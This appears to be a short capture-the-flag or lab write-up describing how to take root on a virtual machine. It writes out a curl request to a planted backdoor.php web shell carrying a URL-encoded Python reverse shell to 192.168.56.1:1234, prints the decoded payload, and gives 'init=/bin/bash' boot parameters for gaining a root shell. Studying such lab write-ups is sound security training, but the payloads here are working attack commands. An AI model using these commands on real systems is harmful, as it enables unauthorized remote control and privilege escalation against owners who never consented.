# writeup 2

We have to do in the same way as in **writeup1** until using **curl** tool))

After doing that we have an incredible way to get the control of the root

**BACKDOOR**

Do not be scared, everything is done for educational purposes)

<img src="img/photo_5435923932709510476_y.jpg">

here is the encrepted code of it 

```
curl --insecure 'https://192.168.56.101/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.56.1%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dpty.spawn%28%22%2Fbin%2Fbash%22%29%3B%27'
```

Don't be scared 2, this is just an url encode python code of this

```
import socket, subprocess, os, pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.56.1",1234));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=pty.spawn("/bin/bash");
```

You can syplly write on your own code then just seach on Google **url encoder** and translate to this

We have done this to get a reverse shell and execute cmd on server,
So, now we need some kind of kernel exploit to have a root
On this picture you can see cmds and potential issues.

<img src="img/Pasted image 20240712011850.png">

and we write
```
#{partition} init=/bin/bash,
live init=/bin/bash
```
And we get the following result

<img src="img/Pasted image 20240712012047.png">

By the way, it turns out that this method works almost on all linux systems currently, and the only way to protect from this is to simply encrypt the disk 🙂
